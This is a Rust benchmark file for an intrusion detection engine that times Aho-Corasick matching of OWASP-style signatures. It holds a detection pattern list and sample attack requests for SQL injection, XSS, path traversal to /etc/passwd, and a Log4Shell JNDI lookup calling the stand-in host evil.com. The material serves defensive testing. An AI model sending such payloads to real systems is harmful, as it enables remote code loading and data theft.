//! Thor IDS — Detection engine benchmarks
//! Run: cargo bench -p thor-ids
//!
//! Benchmarks: Aho-Corasick pattern matching (OWASP signatures)

use criterion::{black_box, criterion_group, criterion_main, Criterion, Throughput};

// Simulate the OWASP WAF Aho-Corasick pattern matching
fn build_ac_matcher() -> aho_corasick::AhoCorasick {
    let patterns = vec![
        "' OR '1'='1", "' OR 1=1--", "<script>", "javascript:",
        "../../../", "cmd.exe", "/etc/passwd", "UNION SELECT",
        "DROP TABLE", "exec(", "eval(", "base64_decode(",
        "\x00", "\r\n", "Content-Type: text/html",
        "X-Forwarded-For:", "Log4j:${", "${jndi:",
        "alert(1)", "document.cookie", "window.location",
    ];
    aho_corasick::AhoCorasick::new(patterns).unwrap()
}

fn bench_ac_pattern_match(c: &mut Criterion) {
    let ac = build_ac_matcher();
    let mut group = c.benchmark_group("aho_corasick_waf");

    let payloads: &[(&str, &str)] = &[
        ("clean_request", "GET /api/users HTTP/1.1\r\nHost: example.com\r\n\r\n"),
        ("sql_injection",  "GET /login?user=' OR '1'='1 HTTP/1.1\r\nHost: evil.com\r\n"),
        ("xss_payload",   "POST /comment HTTP/1.1\r\n\r\n<script>alert(1)</script>"),
        ("log4shell",     "GET / HTTP/1.1\r\nX-Api-Version: ${jndi:ldap://evil.com/x}\r\n"),
        ("path_traversal","GET /../../../etc/passwd HTTP/1.1\r\nHost: target.com\r\n"),
    ];

    for (name, payload) in payloads {
        let payload_bytes = payload.as_bytes();
        group.throughput(Throughput::Bytes(payload_bytes.len() as u64));
        group.bench_function(*name, |b| {
            b.iter(|| {
                let matches: Vec<_> = ac.find_iter(black_box(payload_bytes)).collect();
                black_box(matches.len())
            });
        });
    }
    group.finish();
}

fn bench_bulk_scan(c: &mut Criterion) {
    let ac = build_ac_matcher();
    let mut group = c.benchmark_group("bulk_scan");

    // Simulate 1000 HTTP requests/second
    let clean = "GET /api/health HTTP/1.1\r\nHost: example.com\r\n\r\n";
    let requests: Vec<&str> = (0..1000).map(|_| clean).collect();

    group.throughput(Throughput::Elements(1000));
    group.bench_function("1000_clean_requests", |b| {
        b.iter(|| {
            let count: usize = requests.iter()
                .map(|r| ac.find_iter(black_box(r.as_bytes())).count())
                .sum();
            black_box(count)
        });
    });
    group.finish();
}

criterion_group!(benches, bench_ac_pattern_match, bench_bulk_scan);
criterion_main!(benches);
